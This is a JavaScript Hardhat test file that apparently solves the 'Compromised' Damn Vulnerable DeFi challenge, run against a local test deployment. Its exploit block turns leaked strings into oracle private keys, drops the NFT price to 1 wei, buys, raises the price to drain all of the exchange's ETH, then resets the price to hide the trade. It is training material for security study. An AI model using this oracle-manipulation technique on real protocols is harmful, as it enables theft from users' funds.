const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    // https://www.damnvulnerabledefi.xyz/challenges/7.html
    const FIRST_STRING_FROM_COMPROMISED_SERVER = "4d48686a4e6a63345a575978595745304e545a6b59545931597a5a6d597a55344e6a466b4e4451344f544a6a5a475a68597a426a4e6d4d34597a49314e6a42695a6a426a4f575a69593252685a544a6d4e44637a4e574535"
    const SECOND_STRING_FROM_COMPROMISED_SERVER = "4d4867794d4467794e444a6a4e4442685932526d59546c6c5a4467344f5755324f44566a4d6a4d314e44646859324a6c5a446c695a575a6a4e6a417a4e7a466c4f5467334e575a69593251334d7a597a4e444269596a5134"

    let deployer, attacker;
    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);

        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x1bc16d674ec80000", // 2 ETH
            ]);
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('2'));
        }

        // Attacker starts with 0.1 ETH in balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        const oracleAddr = await (await TrustfulOracleInitializerFactory.deploy(
            sources,
            ["DVNFT", "DVNFT", "DVNFT"],
            [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
        )).oracle()

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracleFactory.attach(oracleAddr);

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await ExchangeFactory.deploy(
            this.oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        const privateKeyFromHex = (hexPrivateKey) => {
          // convert hex string to ascii characters in base64
          const base64Key = ethers.utils.toUtf8String("0x" + hexPrivateKey);
          // base64 decode the ascii string
          return atob(base64Key);
        }

        const compromisedAccounts = [
          FIRST_STRING_FROM_COMPROMISED_SERVER,
          SECOND_STRING_FROM_COMPROMISED_SERVER
        ].map((hexString) =>
          new ethers.Wallet(privateKeyFromHex(hexString), ethers.provider)
        )

        // set the price low enough that the attacker can buy it
        for (let i = 0; i < compromisedAccounts.length; i++) {
          await this.oracle.connect(compromisedAccounts[i]).postPrice(
            "DVNFT",
            ethers.utils.parseUnits('1', 'wei'), // let's just go as low as we can
          );
        }

        // we want to be able to see the emitted events
        let nftId;
        this.exchange.on(
          this.exchange.filters.TokenBought(attacker.address),
          (_address, tokenId, _price) => { nftId = tokenId }
        );
        // could have also done
        // this.exchange.on('TokenBought', (event) => console.log("IT WAS CALLED"));

        // buy the NFT
        const lowNFTPrice = ethers.utils.parseUnits('1', 'wei');
        await this.exchange.connect(attacker).buyOne({
          value: lowNFTPrice,
        });

        // wait for TokenBought event to be emitted
        await new Promise((r) => setTimeout(r, 5000));

        // manipulate the oracle so that it returns a crazy high price
        for (let i = 0; i < compromisedAccounts.length; i++) {
          await this.oracle.connect(compromisedAccounts[i]).postPrice(
            "DVNFT",
            // initial balance plus what was paid for the NFT
            EXCHANGE_INITIAL_ETH_BALANCE.add(lowNFTPrice), // take it all!!!
          );
        }

        // approve the transfer of the token to the exchange
        await this.nftToken.connect(attacker).approve(this.exchange.address, nftId);

        // sell at the high price
        await this.exchange.connect(attacker).sellOne(nftId);

        // reset the price like nothing happened
        for (let i = 0; i < compromisedAccounts.length; i++) {
          await this.oracle.connect(compromisedAccounts[i]).postPrice(
            "DVNFT",
            INITIAL_NFT_PRICE,
          );
        }
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(this.exchange.address)
        ).to.be.eq('0');

        // Attacker's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);

        // Attacker must not own any NFT
        expect(
            await this.nftToken.balanceOf(attacker.address)
        ).to.be.eq('0');

        // NFT price shouldn't have changed
        expect(
            await this.oracle.getMedianPrice("DVNFT")
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
